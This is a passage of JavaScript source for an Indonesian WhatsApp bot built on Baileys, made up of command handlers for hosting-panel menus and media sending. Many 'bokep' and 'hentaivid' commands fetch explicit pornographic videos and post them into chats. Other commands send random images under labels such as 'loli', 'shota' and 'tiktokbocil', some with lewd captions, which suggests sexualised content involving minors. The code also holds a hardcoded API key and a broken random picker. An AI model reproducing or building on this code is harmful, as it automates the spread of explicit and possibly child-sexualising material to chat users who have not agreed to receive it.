if (!isCreator && !isReseller) return reply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama"))
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let u = `*\`</> 乂${command}乂 </>\`*\n
Silahkan Pilih Ram Server Panel!!`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363357312070270@newsletter',
			newsletterName: 'Hutao Cpanel', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Hutao cpanel', 
 thumbnailUrl: 'https://files.catbox.moe/v29m2w.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `*\`</> 乂${command}乂 </>\`*`,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Silahkan Pilih Ram Server Panel!!`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/v29m2w.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By cay\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunli" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gb" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gb" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gb" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gb" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gb" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gb" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gb" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gb" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gb" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gb" }]}]}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break
case "cpanel2": case "addpanel2": case "buatpanel2": {
if (!isCreator && !isReseller) return reply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
global.tempuser = crypto.randomBytes(3).toString('hex')
global.temppw = crypto.randomBytes(4).toString('hex')
let teksnya = "Silahkan Pilih Ram Server Panel, Username & Password Panel Akan Dibuat Secara Otomatis Oleh Bot"
let u = `*\`</> 乂${command}乂 </>\`*\n`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363357312070270@newsletter',
			newsletterName: 'Hutao Cpanel2 otomatis', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Hutao cpanel otomatis', 
 thumbnailUrl: 'https://files.catbox.moe/v29m2w.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `*\`</> 乂${command}乂 </>\`*`,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Silahkan Pilih Ram Server Panel, Username & Password Panel Akan Dibuat Secara Otomatis Oleh Bot!`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/v29m2w.jpg" } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv2" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv2" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv2" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv2" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv2" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv2" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv2" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv2" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv2" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv2" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gbv2" }]}]}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break
case 'bokep': case 'hentaivid2': {
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.owner)
reply(msg.wait)
let sbe = await hentaivid()
let cejd = sbe[Math.floor(Math.random(), sbe.length)]
cay.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
case 'hentaivid': case 'hentaivideo': {
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.owner)
reply('cotto matte kudasaii')
const { hentai } = require('./scrape/screaper.js')
let anu = await hentai()
let result912 = anu[Math.floor(Math.random(), anu.length)]
cay.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Title : ${result912.title}\nCategory : ${result912.category}\nMimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: m })
}
break
case 'paptt':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!q) return reply(`Example ${prefix + command} foto/video`)
let papttfoto = JSON.parse(fs.readFileSync('./database/foto.json'))
let papttvideo = JSON.parse(fs.readFileSync('./database/video.json'))
let titid1 = (pickRandom(papttfoto))
let titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
reply("Foto Akan Dikirim Lewat Private Chat")
cay.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
reply("Video Akan Dikirim Lewat Private Chat")
cay.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Kiamat sudah dekat'})
}
break
case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elaina2':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage':
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
cay.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=haikalgans` } })
break //Powered By Kym
case 'bokep1':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.owner)
let ntahlah1 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2022/08/Brigitte-fucked-at-the-gym.mp4`)
cay.sendMessage(from, { video: ntahlah1, mimetype: 'video/mp4', caption : `ngapain wir`})
.catch(console.error)
break
case 'bokep2':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.owner)
let ntahlah2 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
cay.sendMessage(from, { video: ntahlah2, mimetype: 'video/mp4', caption : `ngapain wir`})
.catch(console.error)
break
case 'bokep3':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.owner)
let ntahlah3 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
cay.sendMessage(from, { video: ntahlah3, mimetype: 'video/mp4', caption : `ngapain wir`})
.catch(console.error)
break
case 'bokep4':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.owner)
let ntahlah4 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
cay.sendMessage(from, { video: ntahlah4, mimetype: 'video/mp4', caption : `ngapain wir`})
.catch(console.error)
break
case 'bokep5':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah5 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
cay.sendMessage(from, { video: ntahlah5, mimetype: 'video/mp4', caption : `ngapain wir`})
.catch(console.error)
break
case 'bokep6':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah6 = await getBuffer(`https://media.discordapp.net/attachments/632434742427516948/1055565623914147910/GrandLiveDinosaur.mp4`)
cay.sendMessage(from, { video: ntahlah6, mimetype: 'video/mp4', caption : `ngapain wir`})
.catch(console.error)
break
case 'bokep7':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah7 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
cay.sendMessage(from, { video: ntahlah7, mimetype: 'video/mp4', caption : `ngapain wir`})
.catch(console.error)
break
case 'bokep8':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah8 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
cay.sendMessage(from, { video: ntahlah8, mimetype: 'video/mp4', caption : `ngapain eir`})
.catch(console.error)
break
case 'bokep9':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah9 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
cay.sendMessage(from, { video: ntahlah9, mimetype: 'video/mp4', caption : `ngapain wi`})
.catch(console.error)
break
case 'bokep10':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah10 = await getBuffer(`https://www.pornhub.com/view_video.php?viewkey=ph62dacb17ee77a`)
cay.sendMessage(from, { video: ntahlah10, mimetype: 'video/mp4', caption : `kontol`})
.catch(console.error)
break
case 'bokep11':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah11 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
cay.sendMessage(from, { video: ntahlah11, mimetype: 'video/mp4', caption : `ngapain wir`})
.catch(console.error)
break
case 'bokep12':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah12 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
cay.sendMessage(from, { video: ntahlah12, mimetype: 'video/mp4', caption : `ngapain eir`})
.catch(console.error)
break
case 'bokep13':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah13 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
cay.sendMessage(from, { video: ntahlah13, mimetype: 'video/mp4', caption : `ngapain jir`})
.catch(console.error)
break
case 'bokep14':
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah14 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
cay.sendMessage(from, { video: ntahlah14, mimetype: 'video/mp4', caption : `ngapain jir`})
.catch(console.error)
break
case 'bokep15':
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah15 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
cay.sendMessage(from, { video: ntahlah15, mimetype: 'video/mp4', caption : `ngapain jit`})
.catch(console.error)
break
case 'bokep16':
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah16 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Ballerina-bot-facial.mp4`)
cay.sendMessage(from, { video: ntahlah16, mimetype: 'video/mp4', caption : `ngapain`})
.catch(console.error)
break
case 'bokep17':
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah17 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
cay.sendMessage(from, { video: ntahlah17, mimetype: 'video/mp4', caption : `ngapain`})
.catch(console.error)
break
case 'bokep18':
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!isCreator && !isOwner && !isPremium) return reply(msg.prem)
let ntahlah18 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
cay.sendMessage(from, { video: ntahlah18, mimetype: 'video/mp4', caption : `ngapain`})
.catch(console.error)
break
// FITUR ASUPAN
case 'tiktokgirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var asupan = JSON.parse(fs.readFileSync('./assets/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
cay.sendMessage(m.chat, { caption: 'don banh', video: { url: ii.url }}, { quoted: m })
break
case 'tiktokghea':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var gheayubi = JSON.parse(fs.readFileSync('./assets/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
cay.sendMessage(m.chat, { caption: 'don banh', video: { url: iii.url }}, { quoted: m })
break
case 'tiktokbocil':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var bocil = JSON.parse(fs.readFileSync('./assets/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
cay.sendMessage(m.chat, { caption: 'don banh', video: { url: iiii.url }}, { quoted: m })
break
case 'tiktoknukhty':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var ukhty = JSON.parse(fs.readFileSync('./assets/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
cay.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiii.url }}, { quoted: m })
break
case 'tiktoksantuy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var santuy = JSON.parse(fs.readFileSync('./assets/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
cay.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiii.url }}, { quoted: m })
break
case 'tiktokkayes':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var kayes = JSON.parse(fs.readFileSync('./assets/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
cay.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiii.url }}, { quoted: m })
break
case 'tiktokpanrika':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var rikagusriani = JSON.parse(fs.readFileSync('./assets/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
cay.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiii.url }}, { quoted: m })
break
case 'tiktoknotnot':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiiii.url }}, { quoted: m })
break
case 'chinese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiii.url } }, { quoted: m })
break
case 'hijab':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiii.url } }, { quoted: m })
break

case 'indo':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'aesthetic':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/kpop.json'))
var ll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/notnot.json'))
var lll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: lll.url } }, { quoted: m })
break
case 'car':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/car.json'))
var llll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/profile.json'))
var llllll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/rose.json'))
var llllllll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ttsearch': {
        if (!text) return reply(`*Masukan Query*:\n\nContoh:\n${prefix + command} jj epep`)
        await cay.sendMessage(m.chat, {
          react: {
            text: "⏱️",
            key: m.key,
          }
        })
        try {
          let tiktoks = await tiktokSearchVideo(text)
          let teks = "*</> TIKTOK SEARCH </>*\n\n"
          let no = 1
          for (let i of tiktoks.videos) {
            let sut = await JSON.stringify(i.author)
            teks += `*Video Info* :
- Nomor : ${no++}
- Username : ${i.author.unique_id}
- Nickname : ${i.author.nickname}
- Duration : ${i.duration} detik

*Statistik Info* :
- Views : ${i.play_count}
- Likes : ${i.digg_count}
- Comment : ${i.comment_count}
- Share : ${i.share_count}

*Caption* :
${i.title}

*Links Video* :
https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}

─────────────────
`
          }
          cay.sendMessage(m.chat, {
            video: {
              url: `https://tikwm.com${tiktoks.videos[0].play}`
            },
            caption: teks
          }, {
            quoted: m
          })
          } catch (error) {
  reply("Error bang")
        }
      }
        break
case 'ulzzangboy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
cay.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
